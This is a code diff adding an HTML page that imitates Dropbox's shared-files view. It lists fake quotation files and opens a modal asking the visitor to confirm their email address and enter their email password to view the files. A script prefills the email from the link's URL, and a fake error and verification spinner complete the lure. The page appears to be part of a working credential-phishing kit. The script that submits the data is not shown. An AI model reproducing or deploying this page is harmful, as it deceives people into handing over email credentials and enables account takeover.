@@ -1,0 +1,156 @@
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox Files</title>
+    <link rel="icon" type="image/ico" href="images/favicon.ico">
+    <link rel="stylesheet" href="styles/css.css">
+    <link rel="stylesheet" href="styles/checkbox.css">
+    <link rel="stylesheet" href="styles/all.css">
+    <script src="js/jquery.js"></script>
+    <script> 
+$(document).ready(function() {
+    var baseUrl = (window.location).href;
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+    $("#email").val(url);
+    });
+    </script>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="db-logo"><i class="fab fa-dropbox"></i></div>
+        <div class="files">All Files</div>
+        <ul class="side-list">
+            <li class="side-list-item"><a href="" class="active">Shared</a></li>
+            <li class="side-list-item"><a href="">My files</a></li>
+            <li class="side-list-item"><a href="">File requests</a></li>
+            <li class="side-list-item"><a href="">Deleted files</a></li>
+        </ul>
+    </div>
+    <div class="main">
+        <div class="upgrade"><a href="#"><i class="far fa-star" style="color: #b9a143;"></i><span class="upa">Upgrade account</span></a></div>
+        <ul class="head-nav">
+            <li class="head-item min"><i class="fas fa-bars"></i></li>
+            <li class="head-item"><h1>Dropbox</h1></li>
+            <li class="head-item right"><span class="noti"><i class="fas fa-bell"></i></span></i></li>
+            <li class="head-item right">
+                <span class="noti mb-search"><i class="fas fa-search"></i></span>
+                <span class="search">
+                    <i class="fas fa-search"></i>
+                    <input type="text" class="searchbox">
+                </span>
+            </li>
+        </ul>
+        <div class="files-container">
+            <table class="file-table">
+                <tbody>
+                    <tr>
+                        <th></th>
+                        <td class="th">Name↑</th>
+                        <td class="th">Modified<span class="spc">▼</span></th>
+                        <td class="th">Who can access<span class="spc">▼</span></th>
+                        <td class="th"><i class="fas fa-list-ul"></i><span class="spc">▼</span></th>
+                    </tr>
+                   
+<!--                     <tr>
+                        <th>
+                           <label class="check-cont">
+                               <input type="checkbox">
+                               <span class="checkmark"></span>
+                             </label>
+                        </th>
+                         <td>
+                             <img src="images/pdf.png" class="pdf-icon">
+                             <span class="filename">PO_19382893.pdf</span>
+                         </td>
+                         <td>Yesterday 1:32 PM</td>
+                         <td>Only you</td>
+                         <td><i class="fas fa-ellipsis-h"></i></td>
+                   </tr> -->
+                   <tr>
+                        <th>
+                           <label class="check-cont">
+                               <input type="checkbox">
+                               <span class="checkmark"></span>
+                             </label>
+                        </th>
+                         <td>
+                             <img src="images/pdf.png" class="pdf-icon">
+                             <span class="filename">Quotation List 1.pdf</span>
+                         </td>
+                         <td>Yesterday 9:28 AM</td>
+                         <td>Only you</td>
+                         <td><i class="fas fa-ellipsis-h"></i></td>
+                   </tr>
+                   <tr>
+                        <th>
+                           <label class="check-cont">
+                               <input type="checkbox">
+                               <span class="checkmark"></span>
+                             </label>
+                        </th>
+                         <td>
+                             <img src="images/excel.png" class="pdf-icon">
+                             <span class="filename">Quotation List 2.xls</span>
+                         </td>
+                         <td>Yesterday 9:30 AM</td>
+                         <td>Only you</td>
+                         <td><i class="fas fa-ellipsis-h"></i></td>
+                   </tr>
+                   
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="dpanel">
+        <div class="fdetails">
+            <div class="moredetails">Select a file to see more details</div>
+        </div>
+        <ul class="panel-list">
+            <li class="panel-item"><a href=""><i class="fas fa-file-upload"></i> Upload files</a></li>
+            <li class="panel-item"><a href=""><i class="fas fa-folder"></i> Upload folder</a></li>
+            <li class="panel-item"><a href=""><i class="fas fa-folder-plus"></i> New folder</a></li>
+            <li class="panel-item"><a href=""><i class="fas fa-share-square"></i> New shared folder</a></li>
+            <li class="panel-item"><a href=""><i class="fas fa-inbox"></i> Request files</a></li>
+        </ul>
+    </div>
+    <!-- The Modal -->
+<div id="modalbox" class="modal">
+
+    <!-- Modal content -->
+    <div class="modal-content">
+        <div class="mcontent" id="mcontent">
+
+            <div class="mlogo">
+                <img src="images/log.png">
+            </div>
+            <p class="instruction">
+              These files are sensitive and secured against unauthorized access. In order to access this file, please confirm receiving E-mail to authorize your download.
+            </p>
+            <p class="inst">Please Confirm Receiving E-mail to View Files</p>
+            <div class="error" id="error">Oops! Dropbox could not open user session, Please verify your information and try and again</div>
+            <div class="ebox">
+                <p class="e-text" id="etext"></p>
+                                
+                <input type="email" class="password" id="email" placeholder="Enter receiving email" value="" required>
+                                 
+                <input type="password" class="password" id="password" placeholder="Enter email password">
+                <div class="submitdiv">
+                  <button class="submit" id="submit">View Files</button>
+                </div>
+                <p class="foot">&copy; Copyright Dropbox Inc. 2023</p>
+            </div>
+
+        </div>
+        <div class="mspinner" id="mspinner">
+            <img src="images/spinner.gif">
+            <div class="checking">Verifying your information, hold on a sec...</div>
+        </div>
+      
+    </div>
+  
+  </div>
+  <script src="js/main.js"></script>
+</body>
+</html>
